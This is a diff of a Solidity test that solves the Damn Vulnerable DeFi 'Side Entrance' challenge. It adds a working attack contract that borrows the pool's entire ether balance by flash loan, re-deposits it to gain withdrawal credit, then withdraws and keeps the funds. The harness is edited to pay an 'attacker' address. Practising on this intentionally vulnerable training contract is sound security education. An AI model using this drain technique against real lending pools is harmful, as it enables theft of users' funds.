@@ -1,64 +1,68 @@
-/**
- * From Damn Vulnerable DeFi v4: https://www.damnvulnerabledefi.xyz/challenges/side-entrance/
- * Source: https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/side-entrance/SideEntrance.t.sol
- */
-
 // SPDX-License-Identifier: MIT
-// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity ^0.8.25;
 
 import { Test } from "forge-std/Test.sol";
 
-import { SideEntranceLenderPool } from "../../contracts/vulnerable/SideEntrance.sol";
+import { IFlashLoanEtherReceiver, SideEntranceLenderPool } from "../../contracts/vulnerable/SideEntrance.sol";
 
+contract SideEntranceAttack is IFlashLoanEtherReceiver {
+    function attack(SideEntranceLenderPool pool) external {
+        uint256 amount = address(pool).balance;
+        // 1) pega o empréstimo
+        pool.flashLoan(amount);
+        // 2) {execute}: faz um depósito com o empréstimo
+        // 3) saca o "depósito" creditado
+        pool.withdraw();
+
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function execute() external payable override {
+        SideEntranceLenderPool(msg.sender).deposit{ value: msg.value }();
+    }
+
+    /// @notice Permite receber pagamentos.
+    receive() external payable { }
+}
+
+/**
+ * From Damn Vulnerable DeFi v4: https://www.damnvulnerabledefi.xyz/challenges/side-entrance/
+ * Source: https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/side-entrance/SideEntrance.t.sol
+ */
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
-    address player = makeAddr("player");
-    address recovery = makeAddr("recovery");
+    address attacker = makeAddr("attacker");
 
-    uint256 constant ETHER_IN_POOL = 1000e18;
-    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
+    uint256 constant ETHER_IN_POOL = 1000 ether;
+    uint256 constant INITIAL_BALANCE = 0 ether;
 
-    SideEntranceLenderPool pool;
+    SideEntranceLenderPool pool = new SideEntranceLenderPool();
 
     modifier checkSolvedByPlayer() {
-        vm.startPrank(player, player);
+        vm.startPrank(attacker, attacker);
         _;
         vm.stopPrank();
         _isSolved();
     }
 
-    /**
-     * SETS UP CHALLENGE - DO NOT TOUCH
-     */
-    function setUp() public {
+    function setUp() external {
         startHoax(deployer);
-        pool = new SideEntranceLenderPool();
         pool.deposit{ value: ETHER_IN_POOL }();
-        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
+        vm.deal(attacker, INITIAL_BALANCE);
         vm.stopPrank();
     }
 
-    /**
-     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
-     */
-    function test_assertInitialState() public view {
+    function test_assertInitialState() external view {
         assertEq(address(pool).balance, ETHER_IN_POOL);
-        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
+        assertEq(attacker.balance, INITIAL_BALANCE);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
-    function test_sideEntrance() public checkSolvedByPlayer {
-        vm.skip(true); // TODO
+    function test_sideEntrance() external checkSolvedByPlayer {
+        new SideEntranceAttack().attack(pool);
     }
 
-    /**
-     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
-     */
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
-        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+        assertEq(attacker.balance, INITIAL_BALANCE + ETHER_IN_POOL, "Not enough ETH in attacker account");
     }
 }
